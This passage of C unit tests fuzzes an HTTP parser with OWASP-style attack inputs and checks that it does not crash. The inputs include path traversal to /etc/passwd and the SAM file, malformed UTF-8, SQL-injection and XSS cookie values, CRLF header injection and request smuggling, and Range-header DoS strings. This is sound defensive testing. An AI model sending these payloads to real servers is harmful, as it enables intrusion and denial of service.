    for (size_t i = 0; i < sizeof(cmd_patterns) / sizeof(cmd_patterns[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET /file?name=test");
        sb_append(sb, cmd_patterns[i]);
        sb_append(sb, " HTTP/1.1\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on command injection patterns");
}

TEST(test_smart_fuzzing_path_traversal_advanced) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("Advanced path traversal attacks");

    fuzz_seed_init(90109);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* traversal_patterns[] = {
        "/../../../etc/passwd",
        "/..\\..\\..\\windows\\system32\\config\\sam",
        "/./.././.././.././etc/passwd",
        "/.../.../.../.../etc/passwd",
        "/..;/..;/..;/etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%252e%252e/%252e%252e/etc/passwd",  // double encoding
        "/..%c0%af..%c0%af..%c0%afetc/passwd",
        "/..%c1%9c..%c1%9c..%c1%9cetc/passwd",
        "/....//....//....//etc/passwd",
        "/.\\.\\.\\.\\etc\\passwd",
        "/.%00./etc/passwd",  // null byte injection
        "/var/www/../../etc/passwd",
        "....\\\\....\\\\....\\\\windows",
    };

    for (size_t i = 0; i < sizeof(traversal_patterns) / sizeof(traversal_patterns[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET ");
        sb_append(sb, traversal_patterns[i]);
        sb_append(sb, " HTTP/1.1\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on advanced path traversal");
}

TEST(test_smart_fuzzing_unicode_attacks) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("Unicode and UTF-8 attacks");

    fuzz_seed_init(10120);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* unicode_attacks[] = {
        // Overlong UTF-8 sequences
        "/\xc0\xae\xc0\xae/\xc0\xae\xc0\xae/etc/passwd",  // overlong ../..
        "/\xe0\x80\xae\xe0\x80\xae/etc/passwd",            // 3-byte overlong

        // UTF-8 BOM
        "\xef\xbb\xbfGET / HTTP/1.1",

        // Right-to-left override
        "/\xe2\x80\xae" "file.txt",

        // Zero-width characters
        "/fi\xe2\x80\x8b" "le.txt",

        // Homograph attacks
        "/\xd0\xb0" "dmin",  // Cyrillic 'a'

        // Invalid UTF-8 sequences
        "/\xff\xfe\xfd\xfc",
        "/\x80\x81\x82\x83",

        // UTF-16 surrogates
        "/\xed\xa0\x80\xed\xb0\x80",

        // Very long UTF-8 sequence
        "/\xfc\x84\x80\x80\x80\x80",
    };

    for (size_t i = 0; i < sizeof(unicode_attacks) / sizeof(unicode_attacks[0]); i++) {
        const char* pattern = unicode_attacks[i];

        // Check if it looks like a full request or just a path
        if (strncmp(pattern, "GET ", 4) == 0 || strncmp(pattern, "\xef\xbb\xbfGET", 6) == 0) {
            // It's a full request
            str_t* sb = str_create_empty(1024);
            if (!sb) continue;
            sb_append(sb, pattern);
            sb_append(sb, "\r\nHost: localhost\r\n\r\n");

            httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
            if (parser) {
                int result = httpparser_run(parser);
                (void)result;
                cleanup_parser(parser);
            }
            str_free(sb);
        } else {
            // It's just a path
            str_t* sb = str_create_empty(1024);
            if (!sb) continue;
            sb_append(sb, "GET ");
            sb_append(sb, pattern);
            sb_append(sb, " HTTP/1.1\r\nHost: localhost\r\n\r\n");

            httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
            if (parser) {
                int result = httpparser_run(parser);
                (void)result;
                cleanup_parser(parser);
            }
            str_free(sb);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on Unicode attacks");
}

TEST(test_smart_fuzzing_http_parameter_pollution) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("HTTP Parameter Pollution (HPP)");

    fuzz_seed_init(21231);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* hpp_attacks[] = {
        "/page?id=1&id=2&id=3",
        "/page?user=admin&user=attacker",
        "/page?action=view&action=delete",
        "/page?id=1%26action=delete",  // encoded &
        "/page?id=1%23&action=delete", // encoded #
        "/page?a=1&a=2&a=3&a=4&a=5&a=6&a=7&a=8&a=9&a=10",  // many duplicates
        "/page?redirect=/safe&redirect=/evil",
        "/page?email=user@good.com&email=hacker@evil.com",
        "/page?callback=safe&callback=evil",
        "/page?id=1&id[]=2&id=3",  // array notation mixed
    };

    for (size_t i = 0; i < sizeof(hpp_attacks) / sizeof(hpp_attacks[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET ");
        sb_append(sb, hpp_attacks[i]);
        sb_append(sb, " HTTP/1.1\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on HPP attacks");
}

TEST(test_smart_fuzzing_cookie_attacks) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("Cookie flooding and manipulation");

    fuzz_seed_init(32342);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    // Test with many cookies
    for (int count = 1; count <= 100; count += 10) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET / HTTP/1.1\r\n");
        sb_append(sb, "Host: localhost\r\n");
        sb_append(sb, "Cookie: ");

        for (int i = 0; i < count; i++) {
            char cookie[64];
            snprintf(cookie, sizeof(cookie), "c%d=v%d", i, i);
            sb_append(sb, cookie);
            if (i < count - 1) sb_append(sb, "; ");
        }

        sb_append(sb, "\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    // Test with malicious cookie values
    const char* malicious_cookies[] = {
        "session='; DROP TABLE sessions--",
        "user=<script>alert('XSS')</script>",
        "id=../../../etc/passwd",
        "token=\x00\x00\x00",
        "data=" "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        "evil=\r\nX-Injected: header",
    };

    for (size_t i = 0; i < sizeof(malicious_cookies) / sizeof(malicious_cookies[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET / HTTP/1.1\r\n");
        sb_append(sb, "Host: localhost\r\n");
        sb_append(sb, "Cookie: ");
        sb_append(sb, malicious_cookies[i]);
        sb_append(sb, "\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on cookie attacks");
}

TEST(test_smart_fuzzing_http_09_requests) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("HTTP/0.9 requests");

    fuzz_seed_init(43453);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* http09_requests[] = {
        "GET /\r\n",                    // Simple HTTP/0.9
        "GET /index.html\r\n",          // HTTP/0.9 with path
        "GET /\n",                      // Just LF
        "GET /index.html\n",
        "GET",                          // No path, no newline
        "GET \r\n",                     // Just method and space
    };

    for (size_t i = 0; i < sizeof(http09_requests) / sizeof(http09_requests[0]); i++) {
        httprequestparser_t* parser = setup_parser_with_data(
            http09_requests[i],
            strlen(http09_requests[i])
        );
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on HTTP/0.9 requests");
}

TEST(test_smart_fuzzing_header_injection) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("HTTP Response Splitting / Header Injection");

    fuzz_seed_init(54564);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* injection_attempts[] = {
        // CRLF injection in various headers
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Forwarded-For: 127.0.0.1\r\nX-Injected: Evil\r\n"
        "\r\n",

        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Referer: http://evil.com\r\n\r\n<script>alert('XSS')</script>\r\n"
        "\r\n",

        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: Mozilla\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n"
        "\r\n",

        // Null byte injection
        "GET / HTTP/1.1\r\n"
        "Host: localhost\x00evil.com\r\n"
        "\r\n",

        // Line folding abuse
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Long-Header: part1\r\n part2\r\n part3\r\n"
        "\r\n",

        // Multiple CRLF
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Evil: value\r\n\r\n\r\nGET /admin HTTP/1.1\r\n"
        "\r\n",
    };

    for (size_t i = 0; i < sizeof(injection_attempts) / sizeof(injection_attempts[0]); i++) {
        httprequestparser_t* parser = setup_parser_with_data(
            injection_attempts[i],
            strlen(injection_attempts[i])
        );
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on header injection attempts");
}

TEST(test_smart_fuzzing_security_headers_bypass) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("Security headers bypass attempts");

    fuzz_seed_init(65675);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* bypass_attempts[] = {
        // X-Forwarded-For spoofing
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "\r\n",

        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Forwarded-For: localhost\r\n"
        "\r\n",

        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Forwarded-For: 1.2.3.4, 127.0.0.1\r\n"
        "\r\n",

        // X-Real-IP spoofing
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Real-IP: 127.0.0.1\r\n"
        "\r\n",

        // Origin bypass
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Origin: null\r\n"
        "\r\n",

        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Origin: http://evil.com\r\n"
        "\r\n",

        // Referer spoofing
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Referer: http://trusted-site.com\r\n"
        "\r\n",

        // User-Agent obfuscation
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: \r\n"
        "\r\n",

        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: " "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
        "\r\n",
    };

    for (size_t i = 0; i < sizeof(bypass_attempts) / sizeof(bypass_attempts[0]); i++) {
        httprequestparser_t* parser = setup_parser_with_data(
            bypass_attempts[i],
            strlen(bypass_attempts[i])
        );
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on security header bypass attempts");
}

TEST(test_smart_fuzzing_range_header_attacks) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("Range header attacks (Apache Killer style)");

    fuzz_seed_init(76786);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* range_attacks[] = {
        // Many ranges (CVE-2011-3192 style)
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Range: bytes=0-1,2-3,4-5,6-7,8-9,10-11,12-13,14-15,16-17,18-19\r\n"
        "\r\n",

        // Overlapping ranges
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Range: bytes=0-100,50-150,100-200\r\n"
        "\r\n",

        // Invalid ranges
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Range: bytes=100-50\r\n"  // end < start
        "\r\n",

        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Range: bytes=-1\r\n"
        "\r\n",

        // Huge ranges
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Range: bytes=0-18446744073709551615\r\n"
        "\r\n",

        // Malformed
        "GET / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Range: bytes=abc-def\r\n"
        "\r\n",
    };

    for (size_t i = 0; i < sizeof(range_attacks) / sizeof(range_attacks[0]); i++) {
        httprequestparser_t* parser = setup_parser_with_data(
            range_attacks[i],
            strlen(range_attacks[i])
        );
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on Range header attacks");
}
